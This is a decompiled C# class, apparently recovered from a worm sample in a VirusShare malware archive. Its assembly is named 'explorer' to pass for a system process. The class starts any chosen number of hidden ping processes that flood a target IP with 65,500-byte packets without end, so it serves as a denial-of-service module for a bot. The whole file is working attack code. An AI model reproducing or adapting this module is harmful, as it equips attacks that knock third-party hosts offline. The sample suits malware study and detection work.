// Decompiled with JetBrains decompiler
// Type: explorer.Ping
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System.Collections.Generic;
using System.Diagnostics;

namespace explorer
{
  internal class Ping
  {
    public static List<Process> processes = new List<Process>();
    public static int threads;
    public static string ip;
    public static bool running = false;

    public static void start()
    {
      if (Ping.running)
        return;
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      processStartInfo.CreateNoWindow = true;
      processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      processStartInfo.FileName = "ping";
      processStartInfo.Arguments = Ping.ip + " -t -l 65500";
      for (int index = 0; index < Ping.threads; ++index)
        Ping.processes.Add(new Process());
      for (int index = 0; index < Ping.threads; ++index)
        Ping.processes[index].StartInfo = processStartInfo;
      for (int index = 0; index < Ping.threads; ++index)
        Ping.processes[index].Start();
      Ping.running = !Ping.running;
    }

    public static void stop()
    {
      if (!Ping.running)
        return;
      for (int index = 0; index < Ping.threads; ++index)
        Ping.processes[index].Kill();
      Ping.running = !Ping.running;
    }
  }
}
